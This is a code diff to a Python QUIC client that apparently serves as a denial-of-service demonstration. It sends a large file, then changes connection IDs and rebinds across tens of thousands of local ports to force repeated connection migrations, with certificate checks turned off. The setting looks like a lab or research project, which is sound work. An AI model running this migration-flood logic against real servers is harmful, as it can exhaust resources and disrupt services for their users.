@@ -63,13 +63,12 @@ async def change_transport(protocol: QuicConnectionProtocol, new_addr, new_port)
 
     old_socket.close()
 
-
 def is_closed(client):
     if client._quic._state in  [QuicConnectionState.CLOSING, QuicConnectionState.DRAINING, QuicConnectionState.TERMINATED]:
         return True
     else:
         return False
-        
+
 async def main(
     host: str,
     port: int
@@ -81,6 +80,8 @@ async def main(
         try:
             configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
             configuration.verify_mode = ssl.CERT_NONE
+
+            start = time.time_ns() 
             async with connect(
                 host,
                 port,
@@ -91,29 +92,28 @@ async def main(
             ) as client:
                 client = cast(DosClientProtocol, client)
 
-                with open("data.txt", "r") as f:
+                with open("2MB.html", "r") as f:
                     data = f.read()
                     await client.send(data)
 
                 
                 await client.send("END")
 
-                # Wait for the peer to send cid
-                while(len(client._quic._peer_cid_available) == 0 and not is_closed(client)):
-                    await asyncio.sleep(1)
-                
-                for port in range(10000, 63000):
+                await asyncio.sleep(1)                
+                for port in range(20000, 63000):
                     if is_closed(client):
                         break
                     client.change_connection_id()
-                    await change_transport(client, "::ffff:10.0.0.45" , port)
+                    await change_transport(client, "::" , port)
                     logger.debug(f"Changed transport to {port}")
                     client.transmit() 
-                    while(len(client._quic._peer_cid_available) == 0 and not is_closed(client)):
-                        await asyncio.sleep(1)
-                    await asyncio.sleep(0.5)
+                    # while(len(client._quic._peer_cid_available) == 0 and not is_closed(client)):
+                        # await asyncio.sleep(1)
+                    await asyncio.sleep(10)
 
                 await client.wait_closed()
+            end = time.time_ns() 
+            print(f"Time taken: {(end-start)/1e9} seconds")
         except ConnectionError:
             print("EXCEPTION: Connection Error")
 
@@ -138,9 +138,10 @@ if __name__ == "__main__":
     logging.basicConfig(
         format="%(asctime)s %(levelname)s %(name)s %(message)s",
         level=logging.DEBUG if args.verbose else logging.INFO,
-        # filename="logs/client.log",
-        # filemode="w"
+        filename="logs/client.log",
+        filemode="w"
     )
+
     
     asyncio.run(
             main(
